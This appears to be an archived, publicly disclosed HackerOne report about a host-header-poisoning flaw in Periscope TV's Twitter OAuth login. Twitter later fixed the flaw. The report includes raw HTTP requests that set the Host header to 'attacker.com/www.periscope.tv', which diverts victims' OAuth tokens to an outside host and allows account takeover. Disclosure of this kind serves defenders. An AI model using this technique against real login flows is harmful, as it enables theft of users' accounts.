---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2018-09-06
submitted: 2018-02-19T03:28:43.256Z
bounty_usd: null
votes: 213
cve: []
program: "[[programs/x|X / xAI]]"
reporter: "ngalog"
source: "https://hackerone.com/reports/317476"
title: "Account Takeover in Periscope TV"
---
# Account Takeover in Periscope TV

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 213 | **Program:** X / xAI | **Disclosed:** 2018-09-06

- Report: [https://hackerone.com/reports/317476](https://hackerone.com/reports/317476)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2018-02-19T03:28:43.256Z

## Report summary

Another way to exploit host header poisoning

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 

When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link to victim, and takeover their account after auto redirect.

## Steps To Reproduce:
Visit https://www.periscope.tv/ and click login with twitter, a request should appear

```
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Change the host header to 

`Host: hackerone.com/www.periscope.tv`

Full request

```
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Response should be something like 

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
```

Send this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.

Vimeo: https://vimeo.com/256356501
password: ███████

## Impact

Account Takeover for periscope.tv

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2018-02-21** @bugtriage-michael: Thanks for the followup.

We have reproduced the behavior you describe. We're looking into this, and we'll keep you updated when we have additional information.

Thank you for thinking of Twitter security.
- **2018-02-21** @ngalog: Thanks!
- **Report Triaged**
- **2018-02-22** @ngalog: nice pro pic, you make me want to change mine lol
- **2018-02-22** @aarun: Thanks mate :-)
- **Bounty Awarded**
- **2018-02-26** @andrewsorensen: We've deployed a fix that should address the issue. Can you please confirm?

Thanks for thinking of Twitter security!
- **2018-02-27** @ngalog: Unless someone beat the regex, I think the fix is good
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
